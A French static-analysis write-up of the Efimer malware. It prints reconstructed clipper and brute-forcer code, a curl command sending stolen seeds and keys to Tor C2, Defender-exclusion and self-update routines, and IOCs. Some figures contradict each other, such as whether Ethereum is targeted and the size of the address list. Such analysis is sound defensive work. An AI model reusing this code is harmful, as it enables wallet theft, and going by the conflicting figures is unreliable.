# Writeup : Efimer : Analyse des payloads (clipper crypto + botnet WordPress)

**Date d'analyse :** 15/07/2026
**Analyste :** Gordon PEIRS
**Type :** Analyse statique uniquement
**Famille :** Efimer (suite de la [Partie 1](04-efimer-clickfix-pyinstaller-pyarmor.md))

## 1. Rappel : Où en est-on ?

La Partie 1 a permis de :
1. Extraire le bundle PyInstaller (37 fichiers)
2. Contourner PyArmor 8.x via `Pyarmor-Static-Unpack-1shot` → clé AES `ab738f35ffce23b13ae73d5a2c17a896`
3. Décompiler `installer.pyc` → source Python partiel
4. Identifier la clé XOR des payloads : `Is8xqLVw7pTB` (constante globale dans le source)

L'installeur déchiffre à l'exécution un répertoire `data_p002` embarqué dans le bundle PyInstaller. Ce répertoire contient 7 fichiers chiffrés avec cette clé XOR (répétition sur 12 octets). L'objectif de cette partie est d'analyser ces payloads.

## 2. Déchiffrement des fichiers `data_p002`

La clé XOR `Is8xqLVw7pTB` (12 octets répétitifs, récupérée depuis les constantes globales de `installer.pyc`) est appliquée à chacun des 7 fichiers du répertoire `data_p002`. Un script Python itère sur le répertoire et vérifie les magic bytes des fichiers déchiffrés :

```
uusd.exe   → magic 4d5a7800  b'MZx\x00'          PE exécutable
002_b.js   → magic 76617220  b'var '              JavaScript WScript
002_n.js   → magic 76617220  b'var '              JavaScript WScript
002a.txt   → magic efbbbf31  b'\xef\xbb\xbf1'     UTF-8 BOM + adresses Bitcoin
002w.txt   → magic 61626..   b'aban'              liste BIP39 (abandon...)
002.xml    → magic fffe3c00  b'\xff\xfe<\x00'     XML UTF-16 LE
pack.js    → magic 66756e63  b'func'              JavaScript template
```

Sept fichiers déchiffrés correctement. `uusd.exe` est un exécutable PE à identifier en priorité. À noter : un 8ème module Python `campus.py` est présent dans le bundle PyInstaller mais n'est **pas** appelé depuis `installer.pyc`, il sera traité séparément (Section 14).

## 3. Identification de `uusd.exe` : le démon Tor embarqué

`file` sur `uusd.exe` retourne un PE32+ console x86-64 de 8,6 Mo. `strings` croise immédiatement les chaînes diagnostiques du projet Tor :

```
Trusted %d dirserver at %s:%d (%s)
Tor can't help you if you use it wrong! Learn how to be safe at https://support.torproject.org/faq/staying-anonymous/
This build of Tor is covered by the GNU General Public License
localhost:9050
Rend stream is %d seconds late. Giving up on address '%s.onion'
```

`uusd.exe` est littéralement le **démon Tor**. Sa présence explique l'ensemble de l'infrastructure C2 : le malware embarque son propre Tor plutôt que de dépendre d'une installation existante. Au démarrage, `uusd.exe` lance un proxy SOCKS5 local sur `127.0.0.1:9050`, que les scripts JS utilisent pour joindre les adresses `.onion`.

Sections PE à entropie basse (non packé, build officiel Tor) :

| Section | Entropie |
|---|---|
| `.text` | 6.06 |
| `.rdata` | 5.67 |
| `.buildid` (RSDS/LLVM) | 0.56 |
| `.data` | 5.02 |

La section `.buildid` contient un GUID RSDS au format CodeView, compilation via LLVM/Clang, cohérent avec le buildbot officiel Tor Windows.

## 4. Analyse de `002.xml` : persistance par tâche planifiée

Le fichier commence par le BOM UTF-16 LE (`\xff\xfe`). Décodage avec `data[2:].decode('utf-16-le')` :

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <Duration>PT99998H58M</Duration>
      </Repetition>
      <StartBoundary>2025-06-01T01:01:01</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-5-4</GroupId>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\wscript.exe</Command>
      <Arguments>C:\Users\Public\Videos\%FOLD%\%NAME%.js</Arguments>
    </Exec>
  </Actions>
</Task>
```

Template de tâche Windows Task Scheduler. Points notables : exécution **toutes les minutes** (`PT1M`) pour une durée quasi-infinie (~4 ans). Les placeholders `%FOLD%` et `%NAME%` sont remplacés par l'installeur avec les slugs journaliers. `S-1-5-4` (Interactive Users) + `LeastPrivilege` = **aucun privilège administrateur requis**. La `StartBoundary` est fixée au passé (`2025-06-01`) pour que la tâche démarre immédiatement à l'enregistrement via `schtasks /create /xml`.

## 5. Analyse de `002w.txt` et `002a.txt` : matière première du clipper

`002w.txt` contient **2 047 lignes**, du mot `abandon` au mot `zoo` : c'est la **liste BIP39 complète** (2 048 mots officiels pour les phrases mnémoniques de portefeuilles crypto, un mot paraît manquant selon le comptage, mais la liste standard démarre à `abandon` et est utilisée telle quelle).

`002a.txt` est beaucoup plus volumineuse : **39 998 lignes** (1,5 Mo), toutes au format `1...`, Bitcoin P2PKH (Legacy) :

```
1JsB1RB6aqXDGztDHVmEtoVu9GQEdekCAT
12cx8PT5Xaw1Y3STdyHtRkrrmQaUdCqz9b
...
```

Ce sont les adresses de l'attaquant utilisées pour le hijacking de presse-papiers : quand la victime copie une adresse Bitcoin, le script la remplace par une des ~40 000 adresses de cette liste.

## 6. Analyse de `002_n.js` : le clipper multi-devises

`002_n.js` est un script **WScript** (exécuté par `wscript.exe`) fortement obfusqué via `obfuscator.io` : toutes les chaînes sont stockées dans un tableau central accédé par `_0xXXXX(0xNN)`, et le tableau est rotationné d'un offset calculé par une IIFE au démarrage. Avant de lire quoi que ce soit de la logique, il faut résoudre ce tableau.

Première tentative de regex pour localiser l'IIFE de validation :

```python
m = re.search(r'while\(!!\[\]\)\{try\{var [^=]+=(.+?)if\([^=]+==[^)]+\)break', src)
```

Pas de match, l'IIFE cherchée utilise `while(!![]){` mais la regex attendait les deux `!` collés. Après correction, la IIFE est capturée mais le calcul du checksum échoue : les appels `parseInt(_0x(...))` sur des chaînes non-numériques retournent `NaN` en JavaScript (contribue `0` à la somme), alors que le code Python utilisait `int()` qui lève une exception. Correction : wrapper `try/except ValueError → 0` pour mimer le comportement JS. Avec le bon offset de rotation, le tableau de 289 entrées se résout correctement.

Les fragments de chaînes ainsi résolus et les fonctions reconstituées depuis le désassemblage Python (`installer.pyc.1shot.das`) donnent le tableau complet :

### 6.1 Variables globales et configuration

```javascript
// Valeurs extraites par désobfuscation complète du tableau de chaînes
var PING_INT   = 0x1 * 0xe10;   // 3600 secondes (ping C2 toutes les heures)
var SHOT_NUM   = 0x5;            // 5 screenshots par détection de seed/clé privée
var SHOT_INT   = 0x5;            // 5 secondes entre screenshots
var DFLT_RSZ   = 0x2;            // taille min de 002a.txt : 2 × 1MB = 2MB avant update

// Adresses hardcodées de l'attaquant (repli si 002a.txt vide)
var btc_1_addrs = ['12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4'];  // BTC P2PKH
var btc_3_addrs = ['32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW'];  // BTC P2SH
var btc_q_addrs = ['bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0'];  // BTC Bech32
var trn_addrs   = ['TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82']; // Tron
var mony_addrs  = ['87Y35DbRFf2G2PyghoVAox4tsxfxqwjZh3AMaxrk...'];  // Monero
```

**7 types de crypto surveillés simultanément** : BTC×4 formats, ETH, TRX, XMR.

### 6.2 Boucle principale : monitoring presse-papiers

```javascript
// Boucle toutes les 0.5 secondes
while (true) {
    WScript.Sleep(0.5 * 1000);
    
    var cdata = GetClipboard();
    if (cdata && cdata != p_cdata) {
        p_cdata = cdata;
        
        // 1. Détection de seed phrase BIP39 (mot par mot)
        var word = CheckWordInBip39(cdata, bip39);
        if (word) {
            bip_n++;
            bip_w += word;
            if (bip_n == 12) {            // 12 mots accumulés
                seed = bip_w;
                bip_n = 0; bip_w = '';
                PingToOnion('SEED', seed); // exfiltration
                for (var ns = 0; ns < SHOT_NUM; ns++) {
                    var screenshot = MakeScreenshot();
                    FileToOnionNW(screenshot, screenshot);
                }
            } else {
                bip_w += ' ';             // continue à accumuler
            }
        }
        
        // 2. Détection de clé privée brute
        var pkey = CheckStrForPKey(cdata);
        if (pkey) {
            PingToOnion('SEED', pkey);
            MakeScreenshot() → FileToOnionNW(...);
        }
        
        // 3. Hijacking d'adresse crypto
        var finalAddr = GetReplacementAddr(cdata);
        if (finalAddr) {
            SetClipboard(finalAddr);      // remplacer le presse-papiers
            PingToOnion('clip', cdata + '|' + finalAddr);
        }
    }
}
```

**Point notable, détection BIP39 inter-événements :** le script accumule les mots BIP39 **sur plusieurs événements de presse-papiers successifs**. Si la victime copie les mots de sa phrase mnémonique un par un (comportement naturel lors d'une saisie manuelle), les 12 mots sont collectés et envoyés au C2. C'est une technique plus subtile que la détection d'une phrase complète en un seul copier.

### 6.3 Communication C2 : Tor SOCKS5

Toutes les communications passent par `curl` en ligne de commande avec le proxy Tor :

```javascript
function PingToOnion(action, data) {
    var url = 'http://swj[...]yid.onion/route.php';
    var cmd = 'curl -X POST -d "GUID=' + GUID + '&action=' + action + '&data=' + data + '"'
            + ' --socks5-hostname localhost:9050 ' + url;
    WScript.Shell.Run(cmd, 0, true);   // fenêtre cachée
}
```

Trois adresses `.onion` Tor v3 utilisées par `002_n.js` (chaînes splitées en 7 fragments de 3+10+10+10+10+10+3 caractères dans le bytecode obfusqué, reconstituées par désobfuscation) :

| Variable | URL complète |
|---|---|
| `PING_URL` / `FILE_URL` | `http://hek5ensy7wqqls2cafflihs7sdqr4dwxux47vp3k7pgffeasxsfeeyid.onion/route.php` |
| `STUB_URL` | `http://swjxev2rvxfivi2wvkxre5vaxkjeepxzxva4u4ydm2qbkbakh6wnyead.onion/core/repla.php` |

`PING_URL` : communication principale (GUID, SEED, PKEY, REPL).  
`STUB_URL` : téléchargement de mises à jour (`_installUpdate`) et renouvellement de la liste d'adresses `002a.txt`.

Le flag `--socks5-hostname` force la résolution DNS côté Tor (pas de fuite DNS locale).

**Clés ed25519 des hidden services (extraites des adresses Tor v3) :**

Une adresse Tor v3 encode directement dans ses 56 caractères base32 la clé publique ed25519 du serveur (32 octets), suivi d'un checksum de 2 octets et du numéro de version (0x03). En décoder les 35 octets permet d'extraire les identités cryptographiques des serveurs C2, indépendantes de l'adresse `.onion` :

| Serveur | ed25519 public key |
|---|---|
| PING/FILE clipper | `3915d23658fda105cb42014ab41e5f90e11e0ed7a5f9fabf6afbcc529012bc8a` |
| STUB/UPDATE clipper | `9593725751adca8aa356aaaf1276a0ba92423ef9bd41ca730366a015040a3fac` |
| PING bruteforcer | `315d0912cf977f7162ee20d64d187ddbbc9693d8eb61d21f5d6515285b349e61` |

Les trois clés sont distinctes → **trois hidden services indépendants** (serveurs ou identités séparés). Si l'attaquant fait tourner sa clé privée et publie une nouvelle adresse `.onion`, le nouveau serveur sera reconnaissable par une clé différente. Si au contraire il migre l'infrastructure en gardant la même clé, la continuité sera traçable.

### 6.4 Extension du ciblage : Tor C2, screenshots, 65+ extensions

Depuis le désassemblage Python (`installer.pyc.1shot.das`) :

**65+ extensions de portefeuilles crypto ciblées (liste partielle) :**

| Extension ID | Portefeuille |
|---|---|
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask |
| `fhbohimaelbohpjbbldcngcnapndodjp` | Binance Chain Wallet |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | Coinbase Wallet |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Trust Wallet |
| `dlcobpjiigpikoobohmabehhmhfoodbb` | Phantom (Solana) |
| `nphplpgoakhhjchkkhmiggakijnkhfnd` | Keplr (Cosmos) |
| `...` | *60+ autres* |

La fonction `get_crypto_user()` dans l'installeur Python parcourt également les données locales de **12 portefeuilles de bureau** :
`Atomic`, `Electrum`, `Exodus`, `Bitcoin Core`, `Ethereum wallet`, `Binance`, `Monero GUI`, `Ledger Live`, `Trezor Suite`, `SafePal`, `KeepKey`, `Armory`.

### 6.5 Forensique du clipper : couverture des devises et mécanisme MakeREPL

L'analyse du code désobfusqué permet de reconstituer la logique de détection clipboard dans son intégralité. Toutes les branches d'exécution passent d'abord par un filtre commun : l'adresse doit être entièrement alphanumérique (`/^[A-Za-z0-9]+$/`), contenir au moins une lettre et au moins un chiffre. Ce pré-filtre élimine notamment les URL, les noms de fichiers et les adresses Ethereum (`0x...`).

**Table de couverture par type d'adresse :**

| Type | Condition | Longueur attendue | Longueur réelle | Gap |
|------|-----------|-------------------|-----------------|-----|
| BTC P2PKH | `charAt(0) === '1'` | 32–36 | 26–34 | adresses < 32 chars manquées (rare) |
| BTC P2SH | `charAt(0) === '3'` | 32–36 | 26–34 | idem |
| BTC P2WPKH | `substr(0,4) === 'bc1q'` | 40–64 | 42 | aucun |
| BTC P2WSH | `substr(0,4) === 'bc1q'` | 40–64 | 62 | aucun |
| BTC P2TR (Taproot) | `substr(0,4) === 'bc1p'` | 40–64 | 62 | aucun, **Taproot supporté** |
| TRX (TRON) | `charAt(0) === 'T'` | exactement 34 | 34 | aucun |
| XMR (Monero) | `charAt(0) === '4' \|\| '8'` | exactement 95 | 95 | aucun |

**Devises non ciblées :** Ethereum et toutes les chaînes EVM (`0x...`) ne sont pas traitées. Le pré-filtre alphanumérique laisse bien passer une adresse ETH (`0x71C7...` est entièrement alphanumérique, contient lettres et chiffres), mais le switch n'a pas de branche pour `firstChar === '0'`. De même pour Solana (longueur variable, pas de handler), Litecoin (`L.../M...`), Dogecoin (`D...`) et Bitcoin Cash.

L'absence d'ETH n'est pas un oubli : c'est un **choix délibéré lié au modèle économique**. L'essentiel des transferts USDT à l'international transitent sur le réseau **TRC-20 (TRON)**, pas ERC-20 (Ethereum), précisément à cause des frais de gas dérisoires de TRON vs Ethereum. Un attaquant qui vise les grosses sommes en USDT cible TRX, pas ETH. Coupler BTC (store of value), TRX (USDT-TRC20 volumétrique), XMR (intraçable) et ignorer ETH révèle une **hyper-spécialisation sur le vol de volumes USDT** et les utilisateurs crypto actifs, pas les détenteurs passifs d'ETH sur Metamask.

**Capacités avancées au-delà du clipper :**

`CheckStrForPKey` détecte dans le presse-papiers :
```
/(?:^|[\s:])(0x[0-9A-Fa-f]{64}|[5KL][1-9A-HJ-NP-Za-km-z]{50,51})(?=\s|$|[^\w])/g
```
→ clé privée brute hex (`0x` + 64 chars) ou WIF (`5`/`K`/`L`, 51-52 chars)
```
/(?:^|[\s:])([xyz]prv[1-9A-HJ-NP-Za-km-z]{107,108})(?=\s|$|[^\w])/g
```
→ clé étendue HD wallet (`xprv`/`yprv`/`zprv`, 111-112 chars)

`CheckStrForSeed` détecte les phrases mnémoniques BIP39 :
```
/(?:\b\d+\.\s*)?([a-z]{3,8}(?:[\s0-9.]+[a-z]{3,8}){23})/gi   ← 24 mots
/(?:\b\d+\.\s*)?([a-z]{3,8}(?:[\s0-9.]+[a-z]{3,8}){11})/gi   ← 12 mots
```
Le pattern `(?:\b\d+\.\s*)?` rend la détection **tolérante aux listes numérotées** (`1. word 2. word ...`), ce qui couvre les victimes qui copient leur seed depuis un document où elle est présentée sous forme de liste. Une garde additionnelle (`len(context) - len(match) < 200`) réduit les faux positifs.

**Le mécanisme MakeREPL, remplacement visuellement indétectable :**

La liste `002a.txt` (200 000+ adresses) est indexée au chargement par `LoadREPL` selon les caractères de fin et de début. Pour une adresse victime, `MakeREPL` cherche dans l'index un remplacement qui partage les mêmes caractères finaux :

- P2PKH/P2SH : priorité à `suffix2 + chars[1:3]` (s4), puis `suffix2 + chars[1:2]` (s3), puis `suffix2` seul (s2), puis dernier char (s1), puis fallback
- bc1q/bc1p : priorité aux 4 derniers chars (s4), puis 3, puis 2, puis 1, puis fallback

Une victime qui vérifie visuellement les 2-3 derniers caractères de l'adresse destination, pratique courante, voit une correspondance parfaite avec l'adresse affichée avant copie. Le swap est **fonctionnellement invisible** à l'inspection rapide.

## 7. Analyse de `002_b.js` : le bruteforcer WordPress

`002_b.js` est un deuxième script WScript : un **bruteforcer XMLRPC WordPress multi-thread** entièrement en JavaScript (activement distinct du clipper, exécuté séparément).

### 7.1 Architecture

```
C2 onion (via Tor)
  config['brute_dom_stack']  → liste de domaines WordPress cibles
  config['brute_pwd_stack']  → liste de passwords (ou '*' = générer localement)
    │
    ├─ 20 workers CHECK  ($1) ─► GET /xmlrpc.php → HTTP 200 ?
    │     → oui : passe le domaine au pool brute
    │     → User-Agent : pool de 12 UA réels, 1 par requête (rotation aléatoire)
    │
    └─ 40 workers BRUTE  ($2) ─► pour chaque domaine :
          WPGetUsers() : GET /wp-json/wp/v2/users → énumérer les auteurs
          genDomainPwd(domain) : ~60 variantes de mot de passe
          WPTryPost(domain, user, pass) : POST /xmlrpc.php
              méthode : blogger.newPost  ← méthode Blogger héritée, supportée par WordPress
              → succès : PingToOnion('GOOD', domain|user|pass)
```

La séparation check/brute (20 + 40 threads) optimise le débit : les workers légers en mode $1 filtrent les cibles inatteignables avant d'engager la force brute. Les 12 User-Agents du pool couvrent Chrome/Firefox/Edge sur Win10, Win11 et macOS, chaque requête en tire un aléatoirement pour éviter la détection par empreinte UA.

### 7.2 Génération de mots de passe basés sur le domaine

```javascript
function genDomainPwd(domain) {
    // Ex: pour "example.com" génère : "exam", "ample", "example", "exampl",
    //     "3xampl3", "Ex@mpl3", "EXAMPLE", "Examplecom", "example.com", ...
    var parts = domain.split('.');
    var base  = parts[0];      // "example"
    // Substitutions leet : a→@, e→3, i→!, o→0, s→5
    // Casse aléatoire : tout majuscule, première majuscule, tout minuscule
    // Combinaisons avec TLD : base+TLD, base+'.'+TLD, base+'_'+TLD
    // Total : jusqu'à BRUTE_DPWD_COUNT = 60 candidates
}
```

C'est une technique classique : les admins WordPress utilisent souvent un mot de passe dérivé de leur nom de domaine.

### 7.3 Communication C2

Même infrastructure Tor, mais C2 différent :
```javascript
var PING_URL = 'http://gfoqsewps57xcyxoedle2gd53o6jne6y5nq5eh25muksqwzutzq7b3ad.onion/route.php';
// curl -X POST -d "..." --socks5 localhost:9050 <url>
```

Le C2 envoie des commandes :
- `brute_dom_list=domain1,domain2,...` : nouvelle liste de cibles
- `U<base64_script>!` : mise à jour du script (`_installUpdate`)
- `U!` seul : auto-destruction (`_selfDestruct`)

## 8. Analyse de `pack.js` : stub de déchiffrement dynamique

```javascript
// Reconstitué (obfusqué dans le binaire)
var _bdata = '%P%';    // placeholder → base64(XOR(script réel))
var _passw = '%D%';    // placeholder → clé XOR

eval(_decryptContent(_base64Decode(_bdata), _passw));
```

`pack.js` est un **template** : l'installeur Python y remplace `%P%` et `%D%` par le contenu XOR-chiffré en base64 et la clé correspondante avant d'écrire le fichier final sur disque. Ainsi, le script JS déposé dans `C:\Users\Public\Videos\[slug]\[task].js` n'est jamais `002_n.js` brut, c'est `pack.js` rempli, qui déchiffre et `eval()`-ue `002_n.js` à chaque exécution. Double couche d'obfuscation sur disque.

## 9. Flux d'exécution complet de l'installeur

Voici la séquence exacte reconstituée depuis `installer.pyc.1shot.das` (function `main()`, lignes 5127–5300) :

```
1. check_sandbox_fast()   → compte les fichiers dans %APPDATA%\Microsoft\Windows\Recent
                            si < 32 fichiers : sandbox détectée → abort

2. os.makedirs(TARGET_FOLDER)       → C:\Users\Public\Videos\[FOLD_NAME0]\
   hide_directory(TARGET_FOLDER)    → attribut HIDDEN sur le dossier

3. add_defn_exclusion(path) × 3    → Defender exclusion sur :
       CUREXE_FOLDER, TARGET_FOLDER, USRTEMP_FOLDER + lettres de lecteur D:..Z:
   add_defn_exclusion(process) × 2 → Defender process exclusion :
       C:\Windows\System32\cmd.exe
       C:\Windows\System32\clip.exe

4. time.sleep(1)

5. create_new_GUID()

6. extract_data('uusd.exe')         → copie binaire dans TARGET_FOLDER
   extract_data('002w.txt')         → copie dans TARGET_FOLDER
   extract_data('002a.txt')         → copie dans TARGET_FOLDER

7. decrypt_data('pack.js')          → XOR-déchiffre pack.js

8. get_crypto_user()                → scan portefeuilles bureau (Exodus, Electrum, Ledger...)
                                      écriture crypto.inf si wallets détectés

9. get_country_code()               → curl https://ipinfo.io/country [-s --max-time 10]
                                      stocke code 2 lettres dans cinfo.inf
                                      [pas de filtre côté client, voir Section 10]

10. decrypt_data('002_n.js')        → XOR-déchiffre le clipper
    obfsc_script(002_n.js)          → ré-obfuscation dynamique (identifiants aléatoires)
    build_script(002_n.js, pack.js) → remplace %P% et %D% dans pack.js

11. outfile_data(TASK_NAME1+'.js')  → C:\Users\Public\Videos\[FOLD]\[TASK1].js
    time.sleep(1)

12. decrypt_data('002.xml')         → XOR-déchiffre template XML
    .decode('utf-16le')
    .replace('%FOLD%', FOLD_NAME0)
    .replace('%NAME%', TASK_NAME1)
    .encode('utf-16le')
    outfile_data(TASK_NAME1+'.xml')
    add_to_schtask(TASK_NAME1, xml_path)   → schtasks /create /xml <path>

13. os.path.join(TARGET_FOLDER, TASK_NAME1+'.js') → chemin du script pour le Registre
    add_to_startup(js_path, TASK_NAME1)    → HKCU\...\Run [TASK_NAME1] = wscript.exe "<path>"
```

**Remarques :**
- `002_b.js` n'est **pas** déployé depuis `main()`, il est probablement envoyé par le C2 via une commande `EVAL` sur les victimes sélectionnées
- La propagation USB (`checkNewDrives`, `ControlDrive`, `RefreshDrive`) est **prévue mais non implémentée** dans cette version (voir Section 13)
- **Obfuscation dynamique (étape 10)** : chaque infection génère une variante unique du script JS. Aucun hash de fichier sur disque n'est stable entre deux victimes → IoC fichier-based peu fiables

## 10. Anti-sandbox, Defender et géo-filtre

### 10.1 Anti-sandbox : `check_sandbox_fast()`

```python
def check_sandbox_fast():
    recent = os.path.join(
        os.environ['APPDATA'],
        'Microsoft', 'Windows', 'Recent'
    )
    try:
        count = len(os.listdir(recent))
        return count < 32   # True = sandbox détectée
    except:
        return True
```

Si le dossier `%APPDATA%\Microsoft\Windows\Recent` contient moins de 32 fichiers, l'installeur considère qu'il s'exécute dans un environnement sandbox (les sandboxes d'analyse ont un historique vide ou très court) et abandonne sans infection.

### 10.2 Contournement Windows Defender

```python
EXCLUSIONS_PATHS = [CUREXE_FOLDER, TARGET_FOLDER, USRTEMP_FOLDER] \
                 + ['D:\\', 'E:\\', 'F:\\', 'G:\\', 'X:\\', 'Y:\\', 'Z:\\']

EXCLUSIONS_PROCESSES = [
    'C:\\Windows\\System32\\cmd.exe',
    'C:\\Windows\\System32\\clip.exe'
]
```

`add_defn_exclusion()` appelle `PowerShell Add-MpPreference` pour ajouter ces exclusions. L'exclusion de `cmd.exe` et `clip.exe` évite que Defender bloque les commandes shell utilisées par les scripts JS (`WScript.Shell.Run("cmd.exe /c echo|set/p=..." | clip)`).

### 10.3 Géo-filtre : côté serveur uniquement

```python
# get_country_code() : code complet
result = subprocess.run(
    ['curl', '-s', '--max-time', '10', 'https://ipinfo.io/country'],
    capture_output=True, text=True,
    creationflags=subprocess.CREATE_NO_WINDOW
)
country = result.stdout.strip()[:2].upper()   # "FR", "RU", "US", ...
open(os.path.join(TARGET_FOLDER, 'cinfo.inf'), 'w').write(country)
```

**Il n'y a pas de géo-filtre côté client.** La fonction écrit simplement le code pays dans `cinfo.inf` et l'installeur continue toujours. Le filtre réel est **côté serveur** : le C2 reçoit le code pays via `&GEIP=XX` dans chaque requête et décide si la victime mérite une réponse active ou doit être ignorée.

## 11. IOCs consolidés (Partie 2)

### Fichiers déposés

| Chemin | Contenu |
|---|---|
| `C:\Users\Public\Videos\[slug]\[task1].js` | Clipper crypto (pack.js + 002_n.js chiffré) |
| `C:\Users\Public\Videos\[slug]\[task1].xml` | Template tâche planifiée (déjà importé) |
| `C:\Users\Public\Videos\[slug]\[task0].js` | Bruteforcer WordPress (pack.js + 002_b.js chiffré) |
| `C:\Users\Public\Videos\[slug]\uusd.exe` | Démon Tor (GPLv3, ~8,6 Mo) |
| `C:\Users\Public\Videos\[slug]\cinfo.inf` | Code pays (2 lettres) |
| `C:\Users\Public\Videos\[slug]\crypto.inf` | Flag : wallets bureau détectés |
| `C:\Users\Public\Videos\[slug]\GUID` | Identifiant victime |

### Adresses crypto hardcodées (attaquant)

| Format | Adresse |
|---|---|
| BTC P2PKH | `12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4` |
| BTC P2SH | `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW` |
| BTC Bech32 | `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0` |
| TRX | `TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82` |
| XMR | `87Y35DbRFf2G2PyghoVAox4tsxfxqwjZh3AMaxrkjasBNW4rmQWs9hfanP5haACxfnXrKPZoesSP18XciY8xVaoY5MLitaW` |

Ces adresses constituent les **adresses de repli** (hardcodées en dur dans le script JS) si la liste `002a.txt` est vide ou en cours de téléchargement. La liste `002a.txt` (~40 000 adresses BTC P2PKH) est prioritaire ; le script Y revient uniquement si elle est indisponible.

### Réseau

| Indicateur | Valeur |
|---|---|
| Proxy Tor local | `127.0.0.1:9050` (SOCKS5, lancé par `uusd.exe`) |
| C2 clipper (PING/FILE) | `http://hek5ensy7wqqls2cafflihs7sdqr4dwxux47vp3k7pgffeasxsfeeyid.onion/route.php` |
| C2 clipper (STUB/UPDATE) | `http://swjxev2rvxfivi2wvkxre5vaxkjeepxzxva4u4ydm2qbkbakh6wnyead.onion/core/repla.php` |
| C2 bruteforcer | `http://gfoqsewps57xcyxoedle2gd53o6jne6y5nq5eh25muksqwzutzq7b3ad.onion/route.php` |
| Geo-check | `https://ipinfo.io/country` |

*Adresses Tor v3 (56 chars base32 + `.onion`). Toutes récupérées par désobfuscation du tableau de chaînes JS.*

**Clés ed25519 des hidden services (identités cryptographiques des serveurs C2) :**

| Serveur | ed25519 public key |
|---|---|
| PING/FILE clipper | `3915d23658fda105cb42014ab41e5f90e11e0ed7a5f9fabf6afbcc529012bc8a` |
| STUB/UPDATE clipper | `9593725751adca8aa356aaaf1276a0ba92423ef9bd41ca730366a015040a3fac` |
| PING bruteforcer | `315d0912cf977f7162ee20d64d187ddbbc9693d8eb61d21f5d6515285b349e61` |

Ces clés sont encodées dans les adresses `.onion` (base32 des 35 octets = pubkey 32 + checksum 2 + version 1). Elles constituent des IoCs plus stables que les adresses `.onion` elles-mêmes : si le serveur tourne son adresse mais conserve sa clé privée, la continuité reste traçable.

### Comportement

| Comportement | Détail |
|---|---|
| Anti-sandbox | Vérification `%APPDATA%\Microsoft\Windows\Recent` : < 32 fichiers → abort |
| AV bypass | `Add-MpPreference` : exclusions paths (dossier install + TEMP + lecteurs) + exclusions process (`cmd.exe`, `clip.exe`) |
| Persistance | Tâche planifiée `schtasks /create /xml`, toutes les 60 secondes |
| Clipper BTC | 4 formats : P2PKH (`1...`), P2SH (`3...`), Bech32 (`bc1q...`), Taproot (`bc1p...`) |
| Clipper ETH | Adresses `0x...` |
| Clipper TRX | Adresses Tron `T...` |
| Clipper XMR | Adresses Monero `4...` |
| Seed phrases | BIP39, accumulation inter-événements, seuil 12 mots |
| Desktop wallets | Atomic, Electrum, Exodus, Bitcoin Core, Ledger, Trezor, Monero GUI, Binance, SafePal, KeepKey, Armory |
| Browser wallets | 65+ extensions (MetaMask, Phantom, Coinbase, Trust, Binance…) |
| Fréquence clipboard | Polling toutes les 500ms |
| Ping C2 | Toutes les 3600s (`PING_INT`) |
| Screenshots | 5 captures post-détection (`SHOT_NUM=5`), 5s d'intervalle (`SHOT_INT=5s`) |
| Propagation USB | **Planifiée, non implémentée** (identifiants dans obfuscateur, lettres D/E/F/G/X/Y/Z prévues) |
| WordPress bruteforce | XMLRPC `blogger.newPost`, passwords dérivés du domaine |

## 12. Mécanisme de mise à jour automatique : `_installUpdate`

Le clipper implémente une mise à jour silencieuse en réponse à une commande `U<base64>!` envoyée par le C2 :

```javascript
function _installUpdate(data) {
    // data = "U<base64_encodé>!" , premier et dernier char délimiteurs
    var payload_b64 = data.substring(1, data.length - 1);
    var payload     = _base64Decode(payload_b64);   // contenu brut du nouveau script

    // 1. Écrire le nouveau script dans le fichier courant (WScript.ScriptFullName)
    var fso  = new ActiveXObject('Scripting.FileSystemObject');
    var file = fso.OpenTextFile(WScript.ScriptFullName, 2, true); // mode écriture
    file.WriteLine(payload);
    file.Close();

    // 2. Tuer tous les autres wscript.exe sauf celui-ci
    _killProcesses();

    // 3. Relancer le script mis à jour
    WScript.Shell.Run('wscript.exe "' + WScript.ScriptFullName + '"');
}
```

La commande `UPDT` (valeur `U!` seule) déclenche le relancement sans mise à jour de contenu. Le C2 peut ainsi pousser n'importe quelle nouvelle version du clipper directement en mémoire, sans interagir avec le disque au-delà du fichier JS cible.

**Renouvellement de la liste d'adresses :**
```javascript
// Dans la boucle principale (toutes les PING_INT = 3600s) :
if (checkFLAGFile() && checkREPLFile()) {
    // checkREPLFile() : true si 002a.txt < 2MB → liste épuisée/insuffisante
    OnionToFile(REPL_PATH) && LoadREPL();
}
```

`OnionToFile()` télécharge une nouvelle liste depuis `STUB_URL` (`swjxev2rv[...].onion/core/repla.php`) quand la liste locale est trop petite (< 2 Mo = `DFLT_RSZ × 1MB`).

## 13. Propagation USB : fonctionnalité planifiée non implémentée

La liste d'identifiants dans `obfsc_script()` (installeur Python) contient des noms de fonctions liées à la propagation USB :

```
checkNewDrives, ControlDrive, RefreshDrive, shortcut, shellApp,
knownDrives, dletter, subFolders, targetFolder, lockPath, isFresh
```

Ces identifiants sont présents dans la **configuration de l'obfuscateur dynamique** pour pouvoir être renommés si un script les contient, mais aucun des scripts JS actuels (`002_n.js`, `002_b.js`) ne les définit. L'installer déclare également une liste de lettres de lecteur USB cibles :

```python
DRIVE_LETTERS = ['D', 'E', 'F', 'G', 'X', 'Y', 'Z']
```

